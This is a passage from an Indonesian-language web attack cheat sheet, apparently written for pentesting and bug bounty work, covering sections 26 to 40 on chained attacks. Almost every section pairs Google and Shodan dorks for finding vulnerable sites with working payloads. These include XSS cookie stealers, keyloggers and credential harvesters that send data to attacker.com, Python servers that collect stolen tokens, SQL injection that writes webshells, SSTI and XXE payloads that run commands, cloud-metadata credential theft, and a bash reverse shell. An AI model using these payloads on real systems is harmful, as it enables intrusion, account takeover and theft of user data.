# Response: {"name":"..","email":"..","password_hash":"$2b$..","ssn":"123-45-6789"}

GET /api/users
# Response: array dengan semua field termasuk yang sensitif
```

## Bukti
- Field sensitif (password_hash, SSN, internal_notes) ada di response API
- UI hanya menampilkan sebagian, tapi API mengirim semua

---

# 🔗 CHAINED ATTACKS & KOMBINASI

> **Catatan**: Bagian berikut mendemonstrasikan bagaimana vulnerability bisa di-chain untuk meningkatkan dampak (impact escalation). Ini adalah teknik yang sering digunakan di real-world pentest dan bug bounty.

---

# 26. CSRF → Stored XSS (Chained)

**Kategori**: 🔗 Chained Attack | **OWASP**: A01 + A03  
**Tujuan**: Gunakan CSRF untuk menyimpan payload XSS di akun korban

## Dork
```
# Google Dork
inurl:"profile" | inurl:"bio" | inurl:"comment" intext:"<form" ext:php
inurl:"update-profile" -intext:"csrf" -intext:"_token" ext:php

# Shodan
http.html:"<form" http.html:"profile" -"csrf" port:80,443
```

## Skenario
Attacker membuat halaman CSRF yang otomatis mengubah profil/bio korban dengan payload XSS. Saat korban atau admin membuka profil tersebut, XSS ter-trigger.

## Langkah

```html
<!-- CSRF yang menyimpan XSS di profil korban -->
<html>
<body>
<form action="https://target.com/api/update-profile" method="POST">
  <input type="hidden" name="bio" 
    value="<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>">
  <input type="hidden" name="name" value="Normal User">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

<!-- CSRF → XSS di komentar -->
<html>
<body>
<form action="https://target.com/api/comments" method="POST">
  <input type="hidden" name="body" 
    value="<img src=x onerror=fetch('https://attacker.com/exfil?cookie='+document.cookie)>">
  <input type="hidden" name="post_id" value="1">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

<!-- CSRF → XSS via JSON API (jika CORS lemah) -->
<script>
fetch('https://target.com/api/update-profile', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    bio: "<svg onload=alert(document.domain)>",
    website: "javascript:alert(1)"
  })
});
</script>
```

## Bukti
- Bio/komentar korban berubah berisi payload XSS
- Saat halaman profil dibuka → XSS ter-trigger
- Cookie/data tereksfiltrasi ke server attacker

---

# 27. XSS → Session Hijacking (Cookie Stealing)

**Kategori**: 🔗 Chained Attack | **OWASP**: A03 + A07  
**Tujuan**: Gunakan XSS untuk mencuri session cookie → login sebagai korban

## Dork
```
# Google Dork
inurl:"search" | inurl:"q=" | inurl:"comment" ext:php -"HttpOnly"
intext:"document.cookie" | intext:"Set-Cookie" ext:php

# Shodan
http.html:"Set-Cookie" -"HttpOnly" port:80,443
```

## Langkah

```javascript
// ===== METHOD 1: Image beacon =====
<script>
new Image().src="https://attacker.com/steal?cookie="+document.cookie;
</script>

// ===== METHOD 2: Fetch API =====
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: window.location.href,
    localStorage: JSON.stringify(localStorage)
  })
});
</script>

// ===== METHOD 3: WebSocket (bypass CSP) =====
<script>
var ws = new WebSocket('wss://attacker.com/ws');
ws.onopen = function(){
  ws.send(document.cookie);
};
</script>

// ===== METHOD 4: DNS exfiltration (ultra-stealth) =====
<script>
var encoded = btoa(document.cookie).replace(/=/g,'');
new Image().src="https://"+encoded+".attacker.com/x.gif";
</script>

// ===== METHOD 5: Navigator.sendBeacon (reliable) =====
<script>
navigator.sendBeacon('https://attacker.com/steal', 
  new Blob([JSON.stringify({c:document.cookie,u:location.href})], 
  {type:'text/plain'}));
</script>
```

```bash
# Di server attacker, terima cookie:
# Python simple receiver
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[STOLEN] {self.path}')
        self.send_response(200); self.end_headers()
    def do_POST(self):
        data = self.rfile.read(int(self.headers['Content-Length']))
        print(f'[STOLEN] {data.decode()}')
        self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0',8888), H).serve_forever()
"

# Gunakan cookie yang dicuri untuk login
curl -b "session=STOLEN_COOKIE_VALUE" https://target.com/dashboard
```

## Bukti
- Cookie muncul di log server attacker
- Berhasil login sebagai korban menggunakan cookie curian
- Screenshot dashboard korban dari session hijacked

---

# 28. XSS → Keylogger / Data Exfiltration

**Kategori**: 🔗 Chained Attack | **OWASP**: A03  
**Tujuan**: Inject keylogger via XSS untuk capture semua input korban

## Dork
```
# Google Dork
inurl:"comment" | inurl:"review" | inurl:"forum" intext:"<script" ext:php
inurl:"q=" | inurl:"search=" intext:"onkeypress" | intext:"onkeyup"

# Shodan
http.html:"<input type=\"password\"" port:80,443
```

## Langkah

```javascript
// ===== KEYLOGGER BASIC =====
<script>
var keys = '';
document.onkeypress = function(e) {
  keys += e.key;
  if (keys.length > 20) {
    new Image().src = 'https://attacker.com/log?keys=' + encodeURIComponent(keys);
    keys = '';
  }
};
</script>

// ===== FORM HIJACKER (capture login credentials) =====
<script>
document.querySelectorAll('form').forEach(function(f) {
  f.addEventListener('submit', function(e) {
    var data = new FormData(f);
    var obj = {};
    data.forEach(function(v, k) { obj[k] = v; });
    navigator.sendBeacon('https://attacker.com/creds', JSON.stringify(obj));
  });
});
</script>

// ===== CLIPBOARD STEALER =====
<script>
setInterval(function(){
  navigator.clipboard.readText().then(function(t){
    if(t.length > 0) fetch('https://attacker.com/clip?d='+encodeURIComponent(t));
  }).catch(function(){});
}, 3000);
</script>

// ===== SCREENSHOT via html2canvas =====
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
html2canvas(document.body).then(function(canvas){
  fetch('https://attacker.com/screenshot', {
    method:'POST', body: canvas.toDataURL()
  });
});
</script>

// ===== TOKEN/CREDENTIAL HARVESTER =====
<script>
// Steal JWT from localStorage
var jwt = localStorage.getItem('token') || localStorage.getItem('jwt') || localStorage.getItem('access_token');
// Steal from sessionStorage
var sess = sessionStorage.getItem('token');
// Steal from meta tags
var csrf = document.querySelector('meta[name="csrf-token"]')?.content;

fetch('https://attacker.com/harvest', {
  method: 'POST',
  body: JSON.stringify({jwt:jwt, session:sess, csrf:csrf, cookies:document.cookie})
});
</script>
```

## Bukti
- Keystrokes muncul di log server attacker
- Credentials form login tercapture
- Token/JWT berhasil dieksfiltrasi

---

# 29. XSS → CSRF Token Bypass (Chained)

**Kategori**: 🔗 Chained Attack | **OWASP**: A03 + A01  
**Tujuan**: Gunakan XSS untuk membaca CSRF token, lalu lakukan aksi CSRF

## Dork
```
# Google Dork
inurl:"search" | inurl:"q=" ext:php intext:"csrf-token" | intext:"_token"
intext:"meta name=\"csrf" ext:php

# Shodan
http.html:"csrf-token" http.html:"<input" port:80,443
```

## Skenario
Target punya CSRF protection, tapi ada XSS. XSS digunakan untuk extract CSRF token dari halaman, lalu melakukan aksi yang diproteksi.

## Langkah

```javascript
// ===== STEP 1: Baca CSRF token dari halaman =====
// ===== STEP 2: Gunakan token untuk aksi berbahaya =====

// Method 1: Extract dari meta tag
<script>
var csrfToken = document.querySelector('meta[name="csrf-token"]').content;
// Ganti password korban
fetch('/api/change-password', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({new_password: 'pwned123'})
});
</script>

// Method 2: Extract dari hidden form field
<script>
var token = document.querySelector('input[name="_token"]').value;
fetch('/api/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: '_token=' + token + '&email=attacker@evil.com'
});
</script>

// Method 3: Fetch halaman lain untuk ambil token baru
<script>
fetch('/settings').then(r => r.text()).then(html => {
  var parser = new DOMParser();
  var doc = parser.parseFromString(html, 'text/html');
  var token = doc.querySelector('input[name="csrf_token"]').value;
  
  // Sekarang gunakan token untuk delete account
  fetch('/api/delete-account', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'csrf_token=' + token + '&confirm=yes'
  });
});
</script>

// Method 4: Chain → buat admin baru via XSS + CSRF
<script>
fetch('/admin/users/new').then(r => r.text()).then(html => {
  var m = html.match(/name="csrf_token" value="([^"]+)"/);
  if (m) {
    fetch('/admin/users/create', {
      method: 'POST',
      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': m[1]},
      body: JSON.stringify({username:'backdoor', password:'admin123', role:'admin'})
    });
  }
});
</script>
```

## Bukti
- CSRF token berhasil di-extract via XSS
- Aksi yang dilindungi CSRF berhasil dijalankan
- Password/email berhasil diubah meskipun ada CSRF protection

---

# 30. SQLi → File Read / RCE (Chained)

**Kategori**: 🔗 Chained Attack | **OWASP**: A03  
**Tujuan**: Eskalasi SQLi untuk membaca file server atau eksekusi command

## Dork
```
# Google Dork
inurl:".php?id=" intext:"LOAD_FILE" | intext:"INTO OUTFILE"
inurl:".php?id=" intext:"xp_cmdshell" | intext:"EXEC"

# Shodan
"MySQL" port:3306
"PostgreSQL" port:5432
"Microsoft SQL Server" port:1433
```

## Langkah

```bash
# ===== MySQL: LOAD_FILE() untuk baca file =====
GET /products?id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--
GET /products?id=1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4--
GET /products?id=1 UNION SELECT 1,LOAD_FILE('/proc/self/environ'),3,4--

# ===== MySQL: INTO OUTFILE untuk tulis webshell =====
GET /products?id=1 UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3,4 INTO OUTFILE '/var/www/html/shell.php'--

# Akses shell:
GET /shell.php?cmd=id
GET /shell.php?cmd=whoami
GET /shell.php?cmd=cat /etc/passwd

# ===== PostgreSQL: COPY untuk baca file =====
GET /products?id=1; COPY (SELECT '') TO PROGRAM 'id'--
GET /products?id=1; CREATE TABLE hack(output text); COPY hack FROM '/etc/passwd'--

# ===== MSSQL: xp_cmdshell untuk RCE =====
GET /products?id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
GET /products?id=1; EXEC xp_cmdshell 'whoami'--
GET /products?id=1; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'--

# ===== SQLMap automated =====
sqlmap -u "https://target.com/products?id=1" --file-read="/etc/passwd"
sqlmap -u "https://target.com/products?id=1" --os-shell
sqlmap -u "https://target.com/products?id=1" --os-cmd="id"
sqlmap -u "https://target.com/products?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

## Bukti
- Isi file server (/etc/passwd, config.php) terbaca via SQLi
- Webshell berhasil ditulis dan diakses
- Command OS berhasil dijalankan

---

# 31. Open Redirect

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Parameter redirect mengarahkan user ke domain attacker

## Dork
```
# Google Dork
inurl:"redirect=" | inurl:"next=" | inurl:"url=" | inurl:"goto=" ext:php
inurl:"return_to=" | inurl:"redirect_uri=" | inurl:"dest="
inurl:"login" inurl:"redirect" | inurl:"next" | inurl:"return"

# Shodan
http.html:"redirect" http.html:"login" port:80,443
```

## Langkah

```bash
# ===== BASIC PAYLOADS =====
GET /login?redirect=https://attacker.com
GET /login?next=https://attacker.com
GET /login?url=https://attacker.com
GET /login?return_to=https://attacker.com
GET /login?goto=https://attacker.com
GET /logout?redirect_uri=https://attacker.com

# ===== BYPASS FILTER =====
# Double URL encoding
GET /login?redirect=https%3A%2F%2Fattacker.com

# Protocol-relative
GET /login?redirect=//attacker.com
GET /login?redirect=\/\/attacker.com

# Subdomain trick
GET /login?redirect=https://target.com.attacker.com
GET /login?redirect=https://attacker.com/target.com
GET /login?redirect=https://target.com@attacker.com

# Backslash trick
GET /login?redirect=https://attacker.com\@target.com
GET /login?redirect=/\attacker.com

# Data/JavaScript URI
GET /login?redirect=javascript:alert(1)
GET /login?redirect=data:text/html,<script>alert(1)</script>

# Null byte
GET /login?redirect=https://attacker.com%00.target.com

# Tab/newline bypass
GET /login?redirect=https://attacker%09.com
GET /login?redirect=//attacker%0d%0a.com
```

## Bukti
- Browser redirect ke domain attacker setelah login
- URL bar menunjukkan domain attacker
- Screenshot redirect chain

---

# 32. Open Redirect → Token Theft (Chained)

**Kategori**: 🔗 Chained Attack | **OWASP**: A01 + A07  
**Tujuan**: Gunakan open redirect untuk mencuri OAuth token/credential

## Dork
```
# Google Dork
inurl:"oauth" inurl:"redirect_uri=" | inurl:"callback="
inurl:"authorize" inurl:"redirect_uri" | inurl:"client_id"
site:target.com inurl:"redirect" | inurl:"next" | inurl:"return"

# Shodan
http.html:"oauth" http.html:"redirect_uri" port:80,443
```

## Skenario
Aplikasi menggunakan OAuth. Open redirect di `redirect_uri` memungkinkan attacker mencuri authorization code atau access token.

## Langkah

```bash
# ===== OAuth redirect_uri manipulation =====
# Normal flow:
GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback&response_type=code

# Attack: ubah redirect_uri ke attacker
GET /oauth/authorize?client_id=APP&redirect_uri=https://attacker.com/steal&response_type=code

# Bypass jika validasi partial:
GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com.attacker.com/callback&response_type=code
GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback/../../../attacker.com&response_type=code
GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback%23@attacker.com&response_type=code

# ===== Chain: Open Redirect + OAuth =====
# Step 1: Temukan open redirect di target
GET /login?next=//attacker.com → redirects!

# Step 2: Gunakan open redirect sebagai redirect_uri
GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com/login?next=//attacker.com&response_type=token

# Token akan dikirim ke: https://attacker.com/#access_token=STOLEN_TOKEN
```

```python
# Server attacker untuk menangkap token
from http.server import HTTPServer, BaseHTTPRequestHandler
class TokenStealer(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[!] STOLEN TOKEN: {self.path}")
        # Redirect victim back ke halaman normal
        self.send_response(302)
        self.send_header('Location', 'https://target.com')
        self.end_headers()
HTTPServer(('0.0.0.0', 80), TokenStealer).serve_forever()
```

## Bukti
- OAuth token/code muncul di log server attacker
- Berhasil menggunakan token curian untuk akses API
- Screenshot authorization flow yang di-redirect

---

# 33. CORS Misconfiguration

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Server menerima Origin dari domain attacker → data bisa dibaca cross-origin

## Dork
```
# Google Dork
inurl:"/api/" intext:"Access-Control-Allow-Origin: *"
inurl:"/api/" intext:"Access-Control-Allow-Credentials: true"

# Shodan
http.html:"Access-Control-Allow-Origin" port:80,443
http.html:"Access-Control-Allow-Credentials: true" port:80,443
```

## Langkah

```bash
# ===== TEST 1: Reflected Origin =====
curl -H "Origin: https://attacker.com" -I https://target.com/api/user
# Cek response header:
# Access-Control-Allow-Origin: https://attacker.com  ← VULN!
# Access-Control-Allow-Credentials: true              ← CRITICAL!

# ===== TEST 2: Null Origin =====
curl -H "Origin: null" -I https://target.com/api/user
# Access-Control-Allow-Origin: null ← VULN!

# ===== TEST 3: Wildcard with Credentials =====
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true ← VULN! (browser blocks, tapi misconfigured)

# ===== TEST 4: Subdomain wildcard =====
curl -H "Origin: https://evil.target.com" -I https://target.com/api/user
curl -H "Origin: https://targetcom.attacker.com" -I https://target.com/api/user
```

```html
<!-- Exploit: Steal data via CORS misconfiguration -->
<html>
<body>
<script>
// Jika Access-Control-Allow-Origin me-reflect origin attacker
// dan Access-Control-Allow-Credentials: true
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Kirim data korban ke attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
  console.log('Stolen:', data);
});
</script>

<!-- Steal via null origin (sandbox iframe) -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api/user',{credentials:'include'})
.then(r=>r.json())
.then(d=>parent.postMessage(JSON.stringify(d),'*'));
</script>
"></iframe>
<script>
window.onmessage = function(e) {
  fetch('https://attacker.com/steal', {method:'POST', body:e.data});
};
</script>
</body>
</html>
```

## Bukti
- Response header `Access-Control-Allow-Origin` me-reflect origin attacker
- Data sensitif user berhasil dibaca dari domain attacker
- Screenshot response header dan data yang dicuri

---

# 34. Host Header Poisoning → Password Reset

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Manipulasi Host header agar link password reset mengarah ke attacker

## Dork
```
# Google Dork
inurl:"forgot-password" | inurl:"reset-password" | inurl:"recover"
intitle:"Forgot Password" | intitle:"Reset" ext:php

# Shodan
http.html:"forgot password" http.html:"Host:" port:80,443
```

## Langkah

```bash
# ===== BASIC HOST HEADER INJECTION =====
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Server mengirim email reset ke victim berisi:
# https://attacker.com/reset?token=SECRET_TOKEN_HERE

# ===== X-Forwarded-Host =====
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

email=victim@target.com

# ===== VARIASI HEADER =====
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Original-URL: https://attacker.com
X-Rewrite-URL: https://attacker.com
Forwarded: host=attacker.com

# ===== DOUBLE HOST HEADER =====
POST /forgot-password HTTP/1.1
Host: target.com
Host: attacker.com

email=victim@target.com

# ===== ABSOLUTE URL =====
POST https://target.com/forgot-password HTTP/1.1
Host: attacker.com

email=victim@target.com
```

```python
# Attacker server untuk menangkap reset token
from http.server import HTTPServer, BaseHTTPRequestHandler
class ResetCapture(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[!] RESET TOKEN CAPTURED: {self.path}")
        # path = /reset?token=SECRET_TOKEN
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Loading...")
HTTPServer(('0.0.0.0', 80), ResetCapture).serve_forever()
```

## Bukti
- Email reset berisi link ke domain attacker
- Token reset muncul di log server attacker
- Password berhasil direset menggunakan token curian

---

# 35. CRLF Injection → Header Injection

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Inject karakter CR/LF untuk menambah HTTP header atau split response

## Dork
```
# Google Dork
inurl:"redirect=" | inurl:"url=" | inurl:"next=" ext:php
inurl:"%0d%0a" | inurl:"%0d" | inurl:"%0a"

# Shodan
http.html:"Location:" http.html:"redirect" port:80,443
```

## Langkah

```bash
# ===== BASIC CRLF =====
# %0d = \r (Carriage Return)
# %0a = \n (Line Feed)

GET /redirect?url=https://target.com%0d%0aInjected-Header:evil HTTP/1.1

# ===== SET-COOKIE INJECTION =====
GET /redirect?url=https://target.com%0d%0aSet-Cookie:session=attacker_session HTTP/1.1

# ===== XSS VIA CRLF (Response Splitting) =====
GET /redirect?url=https://target.com%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
# Double CRLF ends headers, starts body → XSS!

# ===== ENCODING BYPASS =====
# Double encoding
GET /redirect?url=%250d%250a
# UTF-8
GET /redirect?url=%E5%98%8A%E5%98%8D
# Unicode
GET /redirect?url=\r\n

# ===== HEADER INJECTION PAYLOADS =====
# Add Location header (open redirect)
%0d%0aLocation:https://attacker.com

# Add arbitrary content
%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Defaced</h1>

# Cache poisoning
%0d%0aX-Forwarded-Host:attacker.com

# ===== LOG INJECTION =====
GET /page?param=normal%0d%0a[ADMIN] Password changed successfully HTTP/1.1
```

## Bukti
- Response header baru muncul (Injected-Header, Set-Cookie)
- XSS muncul via response splitting
- Screenshot response headers di Burp

---

# 36. SSTI Basic (Server-Side Template Injection)

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Input diproses oleh template engine → kode server ter-eksekusi

## Dork
```
# Google Dork
inurl:"name=" | inurl:"template=" | inurl:"page=" ext:php
intext:"Jinja2" | intext:"Twig" | intext:"FreeMarker" | intext:"Thymeleaf"
intext:"TemplateSyntaxError" | intext:"Template Error"

# Shodan
"X-Powered-By: Express" port:80,443  # Node.js SSTI
http.html:"Flask" | http.html:"Jinja" port:80,443
```

## Langkah

```bash
# ===== DETECTION: Cari template expression yang diproses =====
GET /page?name={{7*7}}
# Jika response = "49" → SSTI confirmed!

GET /page?name=${7*7}
GET /page?name=<%= 7*7 %>
GET /page?name=#{7*7}
GET /page?name={{7*'7'}}
# Jika response = "7777777" → Jinja2/Twig

# ===== JINJA2 (Python/Flask) =====
# Read config
{{config}}
{{config.items()}}

# OS command execution
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}

# Simpler RCE payloads
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('whoami').read()}}

# ===== TWIG (PHP) =====
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

# ===== FREEMARKER (Java) =====
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ===== ERB (Ruby) =====
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>

# ===== PEBBLE (Java) =====
{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}

# ===== TOOLS =====
# tplmap - automated SSTI exploitation
python3 tplmap.py -u "https://target.com/page?name=test"
python3 tplmap.py -u "https://target.com/page?name=test" --os-shell
```

## Bukti
- Expression `{{7*7}}` menghasilkan `49` di response
- Command OS (`id`, `whoami`) berhasil dijalankan
- Screenshot output command dari SSTI

---

# 37. XXE → SSRF (Chained)

**Kategori**: 🔗 Chained Attack | **OWASP**: A05 + A10  
**Tujuan**: Gunakan XXE untuk membuat server request ke internal service

## Dork
```
# Google Dork
inurl:"xmlrpc.php" | inurl:"/soap" | inurl:"?wsdl"
inurl:"xml" inurl:"upload" | inurl:"import" ext:php

# Shodan
http.html:"wsdl" port:80,443
redis port:6379
"elastic" port:9200
```

## Langkah

```xml
<!-- ===== XXE → SSRF ke internal service ===== -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<data>&xxe;</data>

<!-- ===== XXE → SSRF ke cloud metadata ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>

<!-- ===== XXE → SSRF port scanning ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
]>
<data>&xxe;</data>
<!-- Coba port: 22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017 -->

<!-- ===== XXE → SSRF ke internal API ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-api.local/api/users">
]>
<user><name>&xxe;</name></user>

<!-- ===== XXE Blind SSRF (Out-of-Band) ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<data>&exfil;</data>

<!-- evil.dtd di server attacker: -->
<!-- <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://attacker.com/steal?data=%file;'>">
     %wrapper; -->
```

## Bukti
- Response berisi data dari internal service
- Cloud metadata (IAM credentials) terekspos
- Internal API response terlihat di output XXE

---

# 38. SSRF → Cloud Metadata Exfiltration (Chained)

**Kategori**: 🔗 Chained Attack | **OWASP**: A10  
**Tujuan**: Gunakan SSRF untuk mengakses cloud metadata endpoint

## Dork
```
# Google Dork
inurl:"url=http" | inurl:"fetch" | inurl:"proxy" ext:php
site:*.amazonaws.com | site:*.azurewebsites.net inurl:"url="
inurl:"169.254.169.254"

# Shodan
"EC2" http.html:"ami-id" port:80
http.html:"computeMetadata" port:80
```

## Langkah

```bash
# ===== AWS EC2 Metadata =====
POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/"}
POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
POST /api/fetch {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"}
# Response: AccessKeyId, SecretAccessKey, Token → full AWS access!

# IMDSv2 bypass (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# ===== GCP Metadata =====
POST /api/fetch {"url":"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"}
# Header required: Metadata-Flavor: Google
POST /api/fetch {"url":"http://metadata.google.internal/computeMetadata/v1/project/project-id"}

# ===== Azure Metadata =====
POST /api/fetch {"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
# Header: Metadata: true
POST /api/fetch {"url":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}

# ===== DigitalOcean =====
POST /api/fetch {"url":"http://169.254.169.254/metadata/v1/"}

# ===== Alibaba Cloud =====
POST /api/fetch {"url":"http://100.100.100.200/latest/meta-data/"}

# ===== SSRF BYPASS TECHNIQUES =====
# Decimal IP
POST /api/fetch {"url":"http://2852039166/latest/meta-data/"}
# Hex IP
POST /api/fetch {"url":"http://0xA9FEA9FE/latest/meta-data/"}
# Octal IP
POST /api/fetch {"url":"http://0251.0376.0251.0376/latest/meta-data/"}
# IPv6
POST /api/fetch {"url":"http://[::ffff:169.254.169.254]/latest/meta-data/"}
# DNS rebinding
POST /api/fetch {"url":"http://169.254.169.254.nip.io/latest/meta-data/"}
```

## Bukti
- AWS AccessKeyId dan SecretAccessKey terekspos
- Cloud instance metadata terbaca
- Berhasil menggunakan credentials curian untuk akses cloud resource

---

# 39. File Upload → Web Shell → RCE (Chained)

**Kategori**: 🔗 Chained Attack | **OWASP**: A05 + A03  
**Tujuan**: Upload webshell dan eksekusi command di server

## Dork
```
# Google Dork
inurl:"upload.php" | inurl:"file_upload" ext:php
inurl:"/uploads/" ext:php | ext:phtml | ext:php5
inurl:"wp-content/uploads/" ext:php

# Shodan
http.html:"upload" "multipart/form-data" port:80
http.title:"File Manager" port:80,443
```

## Langkah

```bash
# ===== STEP 1: Buat webshell =====

# PHP webshell (simple)
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# PHP webshell (stealthy)
echo '<?php $k="cmd";if(isset($_REQUEST[$k])){echo "<pre>";system($_REQUEST[$k]);echo "</pre>";} ?>' > image.php.jpg

# JSP webshell
echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jsp

# ASP webshell
echo '<%eval request("cmd")%>' > shell.asp

# ===== STEP 2: Bypass upload filter =====

# Extension bypass
shell.php → shell.php5 / shell.phtml / shell.pHp / shell.php.jpg
shell.jsp → shell.jspx / shell.jsw / shell.jspa

# Content-Type bypass (di Burp)
# Ubah Content-Type: application/x-php → image/jpeg

# Magic bytes bypass
# Tambahkan GIF89a di awal file PHP:
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# .htaccess upload (Apache)
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Sekarang file .jpg akan dieksekusi sebagai PHP

# ===== STEP 3: Upload & eksekusi =====
# Upload file via form/API
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# Akses webshell
GET /uploads/shell.php?cmd=id
GET /uploads/shell.php?cmd=whoami
GET /uploads/shell.php?cmd=cat%20/etc/passwd
GET /uploads/shell.php?cmd=ls%20-la%20/
GET /uploads/shell.php?cmd=uname%20-a

# ===== STEP 4: Reverse shell dari webshell =====
GET /uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'
# Di attacker: nc -lvnp 4444
```

## Bukti
- File berbahaya berhasil diupload melewati filter
- Webshell bisa diakses dan menjalankan command
- Output `id`/`whoami` muncul di browser
- Reverse shell berhasil didapatkan

---

# 40. HTTP Parameter Pollution (HPP)

**Kategori**: Injection | **OWASP**: A03  
**Tujuan**: Parameter yang sama muncul berkali-kali → override nilai

## Dork
```
# Google Dork
inurl:".php?" inurl:"&" inurl:"id=" | inurl:"user=" | inurl:"action="
inurl:"api" inurl:"?" inurl:"&" ext:php

# Shodan
http.html:"?" http.html:"&" port:80,443
```

## Langkah

```bash
# ===== BASIC HPP =====
# Server behavior berbeda tergantung teknologi:
# PHP     → mengambil parameter TERAKHIR
# ASP.NET → mengambil SEMUA (comma-separated)
# Node.js → mengambil parameter PERTAMA
# Python  → mengambil parameter TERAKHIR

# ===== BYPASS SECURITY FILTER =====
# WAF memfilter parameter pertama, tapi server pakai yang kedua
GET /transfer?to=safe_account&to=attacker_account
POST /api/pay?amount=10&amount=10000

# ===== BYPASS ACCESS CONTROL =====
GET /api/users?id=123&admin=false&admin=true
POST /api/update?role=user&role=admin

# ===== BYPASS INPUT VALIDATION =====
# Harga divalidasi di parameter pertama
POST /checkout?price=100&price=1
POST /checkout?discount=0&discount=99

# ===== HPP DI SOCIAL MEDIA SHARING =====
# Manipulasi share URL
GET /share?url=https://target.com&url=https://attacker.com

# ===== HPP + CSRF =====
# Token CSRF dicek di parameter pertama, payload di kedua
POST /change-email?_token=VALID_TOKEN&_token=IGNORED&email=attacker@evil.com

# ===== HPP VIA BODY + URL =====
# Parameter di URL dan body berbeda
POST /transfer?to=safe HTTP/1.1
Content-Type: application/x-www-form-urlencoded

to=attacker&amount=10000

# ===== HPP + IDOR =====
GET /api/profile?user_id=123&user_id=456
# Server mungkin check akses untuk user 123 tapi return data user 456
```

```bash
# Tool untuk automated HPP testing
# Arjun - parameter discovery
